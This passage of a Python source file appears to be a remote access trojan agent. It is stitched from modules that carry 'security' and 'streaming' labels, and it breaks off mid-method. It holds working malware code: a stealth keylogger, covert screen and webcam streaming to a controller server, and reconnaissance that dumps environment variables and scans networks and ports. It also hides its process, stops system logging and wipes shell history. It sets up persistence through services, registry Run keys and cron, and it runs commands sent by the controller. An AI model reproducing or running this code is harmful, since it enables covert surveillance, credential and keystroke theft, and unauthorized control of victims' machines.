        return token
    
    def validate_token(self, token: str) -> Optional[Dict[str, Any]]:
        """Validate an authentication token"""
        try:
            decoded = base64.b64decode(token.encode()).decode()
            token_string, signature = decoded.rsplit(":", 1)
            
            # Verify signature
            expected_signature = hmac.new(
                self.secret_key.encode(),
                token_string.encode(),
                hashlib.sha256
            ).hexdigest()
            
            if not hmac.compare_digest(signature, expected_signature):
                print("Invalid token signature")
                return None
            
            token_data = json.loads(token_string)
            
            # Check expiration
            if time.time() > token_data["expires_at"]:
                print("Token expired")
                if token in self.active_tokens:
                    del self.active_tokens[token]
                return None
            
            return token_data
            
        except Exception as e:
            print(f"Token validation error: {e}")
            return None
    
    def revoke_token(self, token: str):
        """Revoke a token"""
        if token in self.active_tokens:
            del self.active_tokens[token]
            print("Token revoked")
    
    def cleanup_expired_tokens(self):
        """Remove expired tokens"""
        current_time = time.time()
        expired_tokens = [
            token for token, data in self.active_tokens.items()
            if current_time > data["expires_at"]
        ]
        
        for token in expired_tokens:
            del self.active_tokens[token]
        
        if expired_tokens:
            print(f"Cleaned up {len(expired_tokens)} expired tokens")

class EncryptedComms:
    """Encrypted communications for sensitive data"""
    
    def __init__(self, password: str):
        self.key = self._derive_key(password)
        self.cipher = Fernet(self.key)
    
    def _derive_key(self, password: str) -> bytes:
        """Derive encryption key from password"""
        salt = b'stable_salt_for_demo'  # In production, use random salt
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt(self, data: str) -> str:
        """Encrypt string data"""
        encrypted = self.cipher.encrypt(data.encode())
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, encrypted_data: str) -> str:
        """Decrypt string data"""
        try:
            encrypted = base64.b64decode(encrypted_data.encode())
            decrypted = self.cipher.decrypt(encrypted)
            return decrypted.decode()
        except Exception as e:
            print(f"Decryption error: {e}")
            return ""

class SystemRecon:
    """Advanced system reconnaissance capabilities"""
    
    @staticmethod
    def get_system_info() -> Dict[str, Any]:
        """Gather comprehensive system information"""
        info = {
            "hostname": socket.gethostname(),
            "platform": os.name,
            "architecture": "unknown",
            "cpu_count": os.cpu_count(),
            "environment_vars": dict(os.environ),
            "network_interfaces": [],
            "running_processes": [],
            "open_ports": [],
            "user_accounts": [],
            "security_software": []
        }
        
        try:
            import platform
            info["platform_detailed"] = platform.platform()
            info["architecture"] = platform.architecture()
            info["processor"] = platform.processor()
        except:
            pass
        
        try:
            import psutil
            
            # Network interfaces
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    info["network_interfaces"].append({
                        "interface": interface,
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask
                    })
            
            # Running processes
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    info["running_processes"].append(proc.info)
                except:
                    pass
            
            # Network connections
            for conn in psutil.net_connections():
                if conn.laddr:
                    info["open_ports"].append({
                        "port": conn.laddr.port,
                        "family": str(conn.family),
                        "type": str(conn.type),
                        "status": str(conn.status) if conn.status else "UNKNOWN"
                    })
                    
        except ImportError:
            print("psutil not available for detailed system info")
        
        return info
    
    @staticmethod
    def scan_network(target_network: str = "192.168.1.0/24") -> List[str]:
        """Scan network for active hosts"""
        active_hosts = []
        
        try:
            network = ipaddress.ip_network(target_network, strict=False)
            
            for ip in network.hosts():
                if SystemRecon._ping_host(str(ip)):
                    active_hosts.append(str(ip))
                    
        except Exception as e:
            print(f"Network scan error: {e}")
        
        return active_hosts
    
    @staticmethod
    def _ping_host(host: str, timeout: int = 1) -> bool:
        """Ping a host to check if it's alive"""
        try:
            if os.name == 'nt':  # Windows
                result = subprocess.run(
                    ['ping', '-n', '1', '-w', str(timeout * 1000), host],
                    capture_output=True, text=True, timeout=timeout + 1
                )
            else:  # Unix/Linux
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', str(timeout), host],
                    capture_output=True, text=True, timeout=timeout + 1
                )
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def port_scan(host: str, ports: List[int] = None) -> List[int]:
        """Scan specific ports on a host"""
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5900]
        
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    
            except Exception:
                pass
        
        return open_ports

class StealthOperations:
    """Stealth and evasion capabilities"""
    
    @staticmethod
    def hide_process():
        """Attempt to hide the current process"""
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                from ctypes import wintypes
                
                # Set process to run in background
                kernel32 = ctypes.windll.kernel32
                user32 = ctypes.windll.user32
                
                # Hide console window
                console_window = kernel32.GetConsoleWindow()
                if console_window:
                    user32.ShowWindow(console_window, 0)  # SW_HIDE
                    
                print("Process hidden on Windows")
                return True
                
        except Exception as e:
            print(f"Process hiding failed: {e}")
        
        return False
    
    @staticmethod
    def disable_logging():
        """Disable system logging temporarily"""
        try:
            if os.name == 'posix':  # Unix/Linux
                # Redirect logs to /dev/null
                subprocess.run(['sudo', 'service', 'rsyslog', 'stop'], 
                             capture_output=True, check=False)
                print("System logging disabled")
                return True
        except:
            pass
        return False
    
    @staticmethod
    def clear_tracks():
        """Clear evidence of activity"""
        commands_to_clear = []
        
        if os.name == 'posix':  # Unix/Linux
            commands_to_clear = [
                'history -c',  # Clear command history
                'unset HISTFILE',  # Disable history file
                'rm -f ~/.bash_history ~/.zsh_history',  # Remove history files
            ]
        elif os.name == 'nt':  # Windows
            commands_to_clear = [
                'powershell -Command "Clear-History"',
                'del /f /q %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'
            ]
        
        for cmd in commands_to_clear:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, check=False)
            except:
                pass
        
        print("Cleared activity tracks")

class PersistenceMechanism:
    """Advanced persistence mechanisms"""
    
    @staticmethod
    def create_service_persistence(service_name: str, executable_path: str) -> bool:
        """Create system service for persistence"""
        try:
            if os.name == 'nt':  # Windows
                # Create Windows service
                service_cmd = f'sc create {service_name} binPath= "{executable_path}" start= auto'
                result = subprocess.run(service_cmd, shell=True, capture_output=True)
                return result.returncode == 0
                
            else:  # Unix/Linux
                # Create systemd service
                service_content = f"""[Unit]
Description={service_name}
After=network.target

[Service]
Type=simple
ExecStart={executable_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
                service_file = f"/etc/systemd/system/{service_name}.service"
                with open(service_file, 'w') as f:
                    f.write(service_content)
                
                subprocess.run(['systemctl', 'enable', service_name], check=True)
                subprocess.run(['systemctl', 'start', service_name], check=True)
                return True
                
        except Exception as e:
            print(f"Service persistence failed: {e}")
            return False
    
    @staticmethod
    def create_registry_persistence(key_name: str, executable_path: str) -> bool:
        """Create Windows registry persistence"""
        try:
            if os.name == 'nt':
                import winreg
                
                # Add to startup registry key
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
                winreg.CloseKey(key)
                
                print("Registry persistence created")
                return True
                
        except Exception as e:
            print(f"Registry persistence failed: {e}")
        
        return False
    
    @staticmethod
    def create_cron_persistence(job_name: str, executable_path: str, schedule: str = "*/5 * * * *") -> bool:
        """Create cron job persistence on Unix/Linux"""
        try:
            if os.name == 'posix':
                cron_entry = f"{schedule} {executable_path} # {job_name}\n"
                
                # Add to user crontab
                result = subprocess.run(
                    ['crontab', '-l'], 
                    capture_output=True, text=True, check=False
                )
                
                current_crontab = result.stdout if result.returncode == 0 else ""
                
                if job_name not in current_crontab:
                    new_crontab = current_crontab + cron_entry
                    
                    process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
                    process.communicate(input=new_crontab)
                    
                    print("Cron persistence created")
                    return True
                    
        except Exception as e:
            print(f"Cron persistence failed: {e}")
        
        return False

class AdvancedKeylogger:
    """Advanced keylogging with stealth features"""
    
    def __init__(self, log_file: str = ".keylog.dat"):
        self.log_file = log_file
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.keys_buffer = []
        self.buffer_size = 100
        
    def start(self):
        """Start keylogging"""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._keylog_loop, daemon=True)
            self.thread.start()
            print("Keylogger started")
    
    def stop(self):
        """Stop keylogging"""
        if self.running:
            self.running = False
            if self.thread:
                self.thread.join(timeout=5)
            self._flush_buffer()
            print("Keylogger stopped")
    
    def _keylog_loop(self):
        """Main keylogging loop"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    if hasattr(key, 'char') and key.char:
                        self.keys_buffer.append(key.char)
                    else:
                        self.keys_buffer.append(f'[{key.name}]')
                    
                    if len(self.keys_buffer) >= self.buffer_size:
                        self._flush_buffer()
                        
                except AttributeError:
                    self.keys_buffer.append(f'[{str(key)}]')
            
            with keyboard.Listener(on_press=on_press) as listener:
                while self.running:
                    time.sleep(0.1)
                    
        except Exception as e:
            print(f"Keylogger error: {e}")
    
    def _flush_buffer(self):
        """Flush key buffer to file"""
        if self.keys_buffer:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(''.join(self.keys_buffer))
                self.keys_buffer.clear()
            except Exception as e:
                print(f"Buffer flush error: {e}")

class SecurityEnhancements:
    """Main security enhancements manager"""
    
    def __init__(self, password: str = "default_password"):
        self.auth = SecureAuth()
        self.crypto = EncryptedComms(password)
        self.recon = SystemRecon()
        self.stealth = StealthOperations()
        self.persistence = PersistenceMechanism()
        self.keylogger = AdvancedKeylogger()
        
    def initialize_security(self, agent_id: str) -> str:
        """Initialize all security features"""
        print("Initializing security features...")
        
        # Generate authentication token
        token = self.auth.generate_token(agent_id, ["admin", "stealth", "persistence"])
        
        # Enable stealth mode
        self.stealth.hide_process()
        
        # Start keylogger
        self.keylogger.start()
        
        print("Security features initialized")
        return token
    
    def gather_intelligence(self) -> Dict[str, Any]:
        """Gather comprehensive system intelligence"""
        print("Gathering system intelligence...")
        
        intelligence = {
            "system_info": self.recon.get_system_info(),
            "network_scan": self.recon.scan_network(),
            "timestamp": time.time()
        }
        
        # Encrypt sensitive data
        encrypted_intel = self.crypto.encrypt(json.dumps(intelligence))
        
        return {
            "encrypted_data": encrypted_intel,
            "status": "success"
        }
    
    def establish_persistence(self, executable_path: str) -> bool:
        """Establish multiple persistence mechanisms"""
        print("Establishing persistence...")
        
        success = False
        
        # Try multiple persistence methods
        if os.name == 'nt':  # Windows
            success |= self.persistence.create_registry_persistence("SecurityUpdate", executable_path)
            success |= self.persistence.create_service_persistence("SecurityService", executable_path)
        else:  # Unix/Linux
            success |= self.persistence.create_cron_persistence("system_update", executable_path)
            success |= self.persistence.create_service_persistence("security-daemon", executable_path)
        
        return success
    
    def cleanup_and_exit(self):
        """Clean up and exit safely"""
        print("Cleaning up...")
        
        # Stop keylogger
        self.keylogger.stop()
        
        # Clear tracks
        self.stealth.clear_tracks()
        
        # Clean up tokens
        self.auth.cleanup_expired_tokens()
        
        print("Cleanup complete")

# ========================================================================================
# STREAMING FIXES MODULE
# From: streaming_fixes.py
# ========================================================================================

class StreamingStats:
    """Track streaming performance statistics"""
    
    def __init__(self):
        self.frames_sent = 0
        self.bytes_sent = 0
        self.frames_dropped = 0
        self.start_time = time.time()
        self.last_fps_time = time.time()
        self.fps = 0
        
    def update_frame(self, bytes_count: int):
        """Update stats when a frame is sent"""
        self.frames_sent += 1
        self.bytes_sent += bytes_count
        
        # Calculate FPS every second
        current_time = time.time()
        if current_time - self.last_fps_time >= 1.0:
            self.fps = self.frames_sent / (current_time - self.start_time)
            self.last_fps_time = current_time
    
    def drop_frame(self):
        """Record dropped frame"""
        self.frames_dropped += 1
    
    def get_stats(self) -> Dict[str, Any]:
        """Get current statistics"""
        runtime = time.time() - self.start_time
        return {
            "runtime": runtime,
            "frames_sent": self.frames_sent,
            "frames_dropped": self.frames_dropped,
            "bytes_sent": self.bytes_sent,
            "fps": self.fps,
            "avg_frame_size": self.bytes_sent / max(1, self.frames_sent),
            "drop_rate": self.frames_dropped / max(1, self.frames_sent + self.frames_dropped)
        }

class AdaptiveCompression:
    """Adaptive compression based on network conditions"""
    
    def __init__(self, initial_quality: int = 85):
        self.quality = initial_quality
        self.min_quality = 30
        self.max_quality = 95
        self.response_times = []
        self.max_samples = 10
        
    def update_response_time(self, response_time: float):
        """Update compression based on response time"""
        self.response_times.append(response_time)
        if len(self.response_times) > self.max_samples:
            self.response_times.pop(0)
            
        # Adjust quality based on average response time
        avg_time = sum(self.response_times) / len(self.response_times)
        
        if avg_time > 0.5:  # High latency
            self.quality = max(self.min_quality, self.quality - 5)
        elif avg_time < 0.1:  # Low latency
            self.quality = min(self.max_quality, self.quality + 2)
    
    def get_quality(self) -> int:
        """Get current quality setting"""
        return self.quality

class ImprovedScreenStreamer:
    """Improved screen streaming with better error handling and performance"""
    
    def __init__(self, server_url: str, agent_id: str, target_fps: int = 30):
        self.server_url = server_url
        self.agent_id = agent_id
        self.target_fps = target_fps
        self.frame_time = 1.0 / target_fps
        self.running = False
        self.thread: Optional[threading.Thread] = None
        
        # Performance tracking
        self.stats = StreamingStats()
        self.compression = AdaptiveCompression()
        
        # Frame processing
        self.last_frame_hash = None
        self.frame_skip_count = 0
        self.max_skip_frames = 3
        
        # Connection settings
        self.url = f"{server_url}/stream/{agent_id}"
        self.headers = {'Content-Type': 'image/jpeg'}
        self.timeout = 0.1
        
    def start(self):
        """Start the streaming thread"""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._stream_loop, daemon=True)
            self.thread.start()
            print(f"Started screen streaming for agent {self.agent_id}")
    
    def stop(self):
        """Stop the streaming thread"""
        if self.running:
            self.running = False
            if self.thread:
                self.thread.join(timeout=5)
            print(f"Stopped screen streaming for agent {self.agent_id}")
            
            # Log final stats
            final_stats = self.stats.get_stats()
            print(f"Final streaming stats: {final_stats}")
    
    def _stream_loop(self):
        """Main streaming loop with enhanced error handling"""
        with mss.mss() as sct:
            consecutive_errors = 0
            max_consecutive_errors = 10
            
            while self.running and consecutive_errors < max_consecutive_errors:
                try:
                    frame_start = time.time()
                    
                    # Capture screen
                    frame_data = self._capture_frame(sct)
                    if frame_data is None:
                        consecutive_errors += 1
                        continue
                    
                    # Check if frame is duplicate
                    if self._is_duplicate_frame(frame_data):
                        self._maintain_fps(frame_start)
                        continue
                    
                    # Encode frame
                    encoded_frame = self._encode_frame(frame_data)
                    if encoded_frame is None:
                        consecutive_errors += 1
                        continue
                    
                    # Send frame
                    success = self._send_frame(encoded_frame, frame_start)
                    if success:
                        consecutive_errors = 0
                        self.stats.update_frame(len(encoded_frame))
                    else:
                        consecutive_errors += 1
                        self.stats.drop_frame()
                    
                    # Maintain target FPS
                    self._maintain_fps(frame_start)
                    
                except Exception as e:
                    print(f"Error in streaming loop: {e}")
                    consecutive_errors += 1
                    time.sleep(0.1)
            
            if consecutive_errors >= max_consecutive_errors:
                print("Too many consecutive errors, stopping stream")
    
    def _capture_frame(self, sct) -> Optional[np.ndarray]:
        """Capture screen frame with error handling"""
        try:
            # Capture primary monitor
            monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
            sct_img = sct.grab(monitor)
            
            # Convert to numpy array
            frame = np.array(sct_img)
            
            # Handle different color formats
            if frame.shape[2] == 4:  # BGRA
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
            elif frame.shape[2] == 3:  # BGR
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            
            return frame
            
        except Exception as e:
            print(f"Error capturing frame: {e}")
            return None
    
    def _is_duplicate_frame(self, frame: np.ndarray) -> bool:
        """Check if frame is duplicate to previous frame"""
        try:
            # Create hash of frame data
            frame_hash = hashlib.md5(frame.tobytes()).hexdigest()
            
            if frame_hash == self.last_frame_hash:
                self.frame_skip_count += 1
                if self.frame_skip_count < self.max_skip_frames:
                    return True
            else:
                self.frame_skip_count = 0
                self.last_frame_hash = frame_hash
            
            return False
            
        except Exception as e:
            print(f"Error checking frame duplicate: {e}")
            return False
    
    def _encode_frame(self, frame: np.ndarray) -> Optional[bytes]:
        """Encode frame with adaptive compression"""
        try:
            # Resize large frames for better performance
            height, width = frame.shape[:2]
            if width > 1920:
                scale = 1920 / width
                new_width = int(width * scale)
                new_height = int(height * scale)
                frame = cv2.resize(frame, (new_width, new_height), 
                                 interpolation=cv2.INTER_AREA)
            
            # Convert RGB to BGR for OpenCV
            frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            
            # Encode with adaptive quality
            quality = self.compression.get_quality()
            success, buffer = cv2.imencode('.jpg', frame_bgr, [
                cv2.IMWRITE_JPEG_QUALITY, quality,
                cv2.IMWRITE_JPEG_OPTIMIZE, 1,
                cv2.IMWRITE_JPEG_PROGRESSIVE, 1
            ])
            
            if success:
                return buffer.tobytes()
            else:
                print("Failed to encode frame")
                return None
                
        except Exception as e:
            print(f"Error encoding frame: {e}")
            return None
    
    def _send_frame(self, frame_data: bytes, start_time: float) -> bool:
        """Send frame to server with response time tracking"""
        try:
            response = requests.post(
                self.url, 
                data=frame_data, 
                headers=self.headers, 
                timeout=self.timeout
            )
            
            # Update compression based on response time
            response_time = time.time() - start_time
            self.compression.update_response_time(response_time)
            
            return response.status_code == 200
            
        except requests.exceptions.Timeout:
            # Timeout is acceptable for low-latency streaming
            return False
        except Exception as e:
            print(f"Error sending frame: {e}")
            return False
    
    def _maintain_fps(self, frame_start: float):
        """Maintain target FPS timing"""
        elapsed = time.time() - frame_start
        sleep_time = max(0, self.frame_time - elapsed)
        if sleep_time > 0:
            time.sleep(sleep_time)

class ImprovedCameraStreamer:
    """Improved camera streaming with better error handling"""
    
    def __init__(self, server_url: str, agent_id: str, camera_id: int = 0, target_fps: int = 30):
        self.server_url = server_url
        self.agent_id = agent_id
        self.camera_id = camera_id
        self.target_fps = target_fps
        self.frame_time = 1.0 / target_fps
        self.running = False
        self.thread: Optional[threading.Thread] = None
        
        # Performance tracking
        self.stats = StreamingStats()
        self.compression = AdaptiveCompression()
        
        # Camera settings
        self.cap: Optional[cv2.VideoCapture] = None
        self.url = f"{server_url}/camera/{agent_id}"
        self.headers = {'Content-Type': 'image/jpeg'}
        self.timeout = 0.5
    
    def start(self):
        """Start camera streaming"""
        if not self.running:
            if self._init_camera():
                self.running = True
                self.thread = threading.Thread(target=self._stream_loop, daemon=True)
                self.thread.start()
                print(f"Started camera streaming for agent {self.agent_id}")
            else:
                print("Failed to initialize camera")
    
    def stop(self):
        """Stop camera streaming"""
        if self.running:
            self.running = False
            if self.thread:
                self.thread.join(timeout=5)
            if self.cap:
                self.cap.release()
            print(f"Stopped camera streaming for agent {self.agent_id}")
            
            # Log final stats
            final_stats = self.stats.get_stats()
            print(f"Final camera stats: {final_stats}")
    
    def _init_camera(self) -> bool:
        """Initialize camera with proper settings"""
        try:
            # Try different backends
            backends = [cv2.CAP_V4L2, cv2.CAP_ANY]
            
            for backend in backends:
                self.cap = cv2.VideoCapture(self.camera_id, backend)
                if self.cap.isOpened():
                    break
            
            if not self.cap or not self.cap.isOpened():
                print(f"Cannot open camera {self.camera_id}")
                return False
            
            # Set camera properties
            self.cap.set(cv2.CAP_PROP_FPS, self.target_fps)
            self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
            self.cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            
            # Test capture
            ret, frame = self.cap.read()
            if not ret or frame is None:
                print("Camera test capture failed")
                return False
            
            print(f"Camera initialized: {frame.shape}")
            return True
            
        except Exception as e:
            print(f"Error initializing camera: {e}")
            return False
    
    def _stream_loop(self):
        """Main camera streaming loop"""
        consecutive_errors = 0
        max_consecutive_errors = 10
        
        while self.running and consecutive_errors < max_consecutive_errors:
            try:
                frame_start = time.time()
                
                # Capture frame
                ret, frame = self.cap.read()
                if not ret or frame is None:
                    consecutive_errors += 1
                    time.sleep(0.1)
                    continue
                
                # Encode frame
                encoded_frame = self._encode_frame(frame)
                if encoded_frame is None:
                    consecutive_errors += 1
                    continue
                
                # Send frame
                success = self._send_frame(encoded_frame, frame_start)
                if success:
                    consecutive_errors = 0
                    self.stats.update_frame(len(encoded_frame))
                else:
                    consecutive_errors += 1
                    self.stats.drop_frame()
                
                # Maintain target FPS
                self._maintain_fps(frame_start)
                
            except Exception as e:
                print(f"Error in camera loop: {e}")
                consecutive_errors += 1
                time.sleep(0.1)
        
        if consecutive_errors >= max_consecutive_errors:
            print("Too many consecutive camera errors, stopping stream")
    
    def _encode_frame(self, frame: np.ndarray) -> Optional[bytes]:
        """Encode camera frame"""
        try:
            quality = self.compression.get_quality()
            success, buffer = cv2.imencode('.jpg', frame, [
                cv2.IMWRITE_JPEG_QUALITY, quality,
                cv2.IMWRITE_JPEG_OPTIMIZE, 1
            ])
            
            if success:
                return buffer.tobytes()
            else:
                print("Failed to encode camera frame")
                return None
                
        except Exception as e:
            print(f"Error encoding camera frame: {e}")
            return None
    
    def _send_frame(self, frame_data: bytes, start_time: float) -> bool:
        """Send camera frame to server"""
        try:
            response = requests.post(
                self.url,
                data=frame_data,
                headers=self.headers,
                timeout=self.timeout
            )
            
            # Update compression based on response time
            response_time = time.time() - start_time
            self.compression.update_response_time(response_time)
            
            return response.status_code == 200
            
        except requests.exceptions.Timeout:
            return False
        except Exception as e:
            print(f"Error sending camera frame: {e}")
            return False
    
    def _maintain_fps(self, frame_start: float):
        """Maintain target FPS"""
        elapsed = time.time() - frame_start
        sleep_time = max(0, self.frame_time - elapsed)
        if sleep_time > 0:
            time.sleep(sleep_time)

class StreamManager:
    """Manages multiple streams and provides status information"""
    
    def __init__(self, server_url: str, agent_id: str):
        self.server_url = server_url
        self.agent_id = agent_id
        self.screen_streamer: Optional[ImprovedScreenStreamer] = None
        self.camera_streamer: Optional[ImprovedCameraStreamer] = None
    
    def start_screen_stream(self, fps: int = 30):
        """Start screen streaming"""
        if self.screen_streamer is None or not self.screen_streamer.running:
            self.screen_streamer = ImprovedScreenStreamer(
                self.server_url, self.agent_id, fps
            )
            self.screen_streamer.start()
            return True
        return False
    
    def stop_screen_stream(self):
        """Stop screen streaming"""
        if self.screen_streamer and self.screen_streamer.running:
            self.screen_streamer.stop()
            return True
        return False
    
    def start_camera_stream(self, fps: int = 30, camera_id: int = 0):
        """Start camera streaming"""
        if self.camera_streamer is None or not self.camera_streamer.running:
            self.camera_streamer = ImprovedCameraStreamer(
                self.server_url, self.agent_id, camera_id, fps
            )
            self.camera_streamer.start()
            return True
        return False
    
    def stop_camera_stream(self):
        """Stop camera streaming"""
        if self.camera_streamer and self.camera_streamer.running:
            self.camera_streamer.stop()
            return True
        return False
    
    def stop_all_streams(self):
        """Stop all active streams"""
        self.stop_screen_stream()
        self.stop_camera_stream()
    
    def get_status(self) -> Dict[str, Any]:
        """Get streaming status and statistics"""
        status = {
            "screen_streaming": False,
            "camera_streaming": False,
            "screen_stats": None,
            "camera_stats": None
        }
        
        if self.screen_streamer and self.screen_streamer.running:
            status["screen_streaming"] = True
            status["screen_stats"] = self.screen_streamer.stats.get_stats()
        
        if self.camera_streamer and self.camera_streamer.running:
            status["camera_streaming"] = True
            status["camera_stats"] = self.camera_streamer.stats.get_stats()
        
        return status

# ========================================================================================
# ENHANCED AGENT MODULE
# From: enhanced_agent.py
# ========================================================================================

class EnhancedAgent:
    """Enhanced agent with all improvements integrated"""
    
    def __init__(self, server_url: str = "http://localhost:8080"):
        self.server_url = server_url
        self.agent_id = self._generate_enhanced_agent_id()
        self.running = False
        
        # Enhanced components
        self.stream_manager: Optional[StreamManager] = None
        self.security: Optional[SecurityEnhancements] = None
        
        # Legacy support
        self.streaming_enabled = False
        self.camera_streaming_enabled = False
        
        # Initialize enhanced features
        self._initialize_enhancements()
        
        print(f"Enhanced agent initialized with ID: {self.agent_id}")
    
    def _generate_enhanced_agent_id(self) -> str:
        """Generate unique agent ID"""
        try:
            # Try to read existing ID
            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
            if os.path.exists(id_file):
                with open(id_file, 'r') as f:
                    return f.read().strip()
        except:
            pass
        
        # Generate new ID
        agent_id = str(uuid.uuid4())
        
        try:
            # Save ID for persistence
            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
            with open(id_file, 'w') as f:
                f.write(agent_id)
        except:
            pass
        
        return agent_id
    
    def _initialize_enhancements(self):
        """Initialize enhanced features"""
        try:
            # Initialize streaming manager
            self.stream_manager = StreamManager(self.server_url, self.agent_id)
            print("Enhanced streaming manager initialized")
            
            # Initialize security features
            self.security = SecurityEnhancements()
            token = self.security.initialize_security(self.agent_id)
            print(f"Security features initialized with token: {token[:20]}...")
            
        except Exception as e:
            print(f"Error initializing enhancements: {e}")
    
    def start_enhanced(self):
        """Start the enhanced agent"""
        print("Starting enhanced agent...")
        self.running = True
        
        # Register with controller
        self._register_with_controller()
        
        # Start main loop
        self._enhanced_main_loop()
    
    def stop_enhanced(self):
        """Stop the enhanced agent"""
        print("Stopping enhanced agent...")
        self.running = False
        
        # Stop all streams
        self.stop_all_enhanced_streams()
        
        # Security cleanup
        if self.security:
            self.security.cleanup_and_exit()
    
    def _register_with_controller(self):
        """Register agent with controller"""
        try:
            registration_data = {
                "agent_id": self.agent_id,
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "capabilities": self._get_enhanced_capabilities(),
                "timestamp": time.time()
            }
            
            response = requests.post(
                f"{self.server_url}/register",
                json=registration_data,
                timeout=10
            )
            
            if response.status_code == 200:
                print("Successfully registered with controller")
            else:
                print(f"Registration failed: {response.status_code}")
                
        except Exception as e:
            print(f"Registration error: {e}")
    
    def _get_enhanced_capabilities(self) -> List[str]:
        """Get agent capabilities"""
        capabilities = ["basic_commands", "system_info"]
        capabilities.extend(["enhanced_screen_stream", "enhanced_camera_stream"])
        capabilities.extend(["security_features", "reconnaissance", "stealth_mode"])
        return capabilities
    
    def _enhanced_main_loop(self):
        """Main agent loop"""
        last_checkin = 0
        checkin_interval = 30  # Check in every 30 seconds
        
        while self.running:
            try:
                current_time = time.time()
                
                # Periodic check-in
                if current_time - last_checkin > checkin_interval:
                    self._checkin_with_controller()
                    last_checkin = current_time
                
                # Process commands
                self._process_enhanced_commands()
                
                # Small sleep to prevent busy waiting
                time.sleep(1)
                
            except KeyboardInterrupt:
                print("Received interrupt signal")
                break
            except Exception as e:
                print(f"Error in main loop: {e}")
                time.sleep(5)  # Wait before retrying
    
    def _checkin_with_controller(self):
        """Check in with controller"""
        try:
            checkin_data = {
                "agent_id": self.agent_id,
                "status": "active",
                "timestamp": time.time(),
                "streaming_status": self._get_enhanced_streaming_status()
            }
            
            response = requests.post(
                f"{self.server_url}/checkin",
                json=checkin_data,
                timeout=5
            )
            
            if response.status_code != 200:
                print(f"Check-in failed: {response.status_code}")
                
        except Exception as e:
            pass  # Debug level since this is expected to fail sometimes
    
    def _process_enhanced_commands(self):
        """Process pending commands from controller"""
        try:
            response = requests.get(
                f"{self.server_url}/commands/{self.agent_id}",
                timeout=5
            )
            
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    self._execute_enhanced_command(command)
                    
        except Exception as e:
            pass
    
    def _execute_enhanced_command(self, command: Dict[str, Any]):
        """Execute a command"""
        try:
            cmd_type = command.get("type")
            cmd_data = command.get("data", {})
            
            print(f"Executing command: {cmd_type}")
            
            if cmd_type == "start-stream":
                self.start_enhanced_screen_stream()
            elif cmd_type == "stop-stream":
                self.stop_enhanced_screen_stream()
            elif cmd_type == "start-camera":
                self.start_enhanced_camera_stream()
            elif cmd_type == "stop-camera":
                self.stop_enhanced_camera_stream()
            elif cmd_type == "system-info":
                self._send_enhanced_system_info()
            elif cmd_type == "execute":
                self._execute_enhanced_system_command(cmd_data.get("command", ""))
            elif cmd_type == "reconnaissance":
                self._perform_enhanced_reconnaissance()
            else:
                print(f"Unknown command type: {cmd_type}")
                
        except Exception as e:
            print(f"Command execution error: {e}")
    
    def start_enhanced_screen_stream(self, fps: int = 30):
        """Start screen streaming"""
        if self.stream_manager:
            success = self.stream_manager.start_screen_stream(fps)
            if success:
                print("Enhanced screen streaming started")
                return True
        return False
    
    def stop_enhanced_screen_stream(self):
        """Stop screen streaming"""
        if self.stream_manager:
            success = self.stream_manager.stop_screen_stream()
            if success:
                print("Enhanced screen streaming stopped")
                return True
        return False
    
    def start_enhanced_camera_stream(self, fps: int = 30):
        """Start camera streaming"""
        if self.stream_manager:
            success = self.stream_manager.start_camera_stream(fps)
            if success:
                print("Enhanced camera streaming started")
                return True
        return False
    
    def stop_enhanced_camera_stream(self):
        """Stop camera streaming"""
        if self.stream_manager:
            success = self.stream_manager.stop_camera_stream()
            if success:
                print("Enhanced camera streaming stopped")
                return True
        return False
    
    def stop_all_enhanced_streams(self):
        """Stop all active streams"""
        self.stop_enhanced_screen_stream()
        self.stop_enhanced_camera_stream()
        print("All streams stopped")
    
    def _get_enhanced_streaming_status(self) -> Dict[str, Any]:
        """Get current streaming status"""
        if self.stream_manager:
            return self.stream_manager.get_status()
        
        # Legacy status
        return {
            "screen_streaming": self.streaming_enabled,
            "camera_streaming": self.camera_streaming_enabled,
            "screen_stats": None,
            "camera_stats": None
        }
    
    def _send_enhanced_system_info(self):
        """Send system information to controller"""
        try:
            if self.security:
                # Use enhanced reconnaissance
                info = self.security.gather_intelligence()
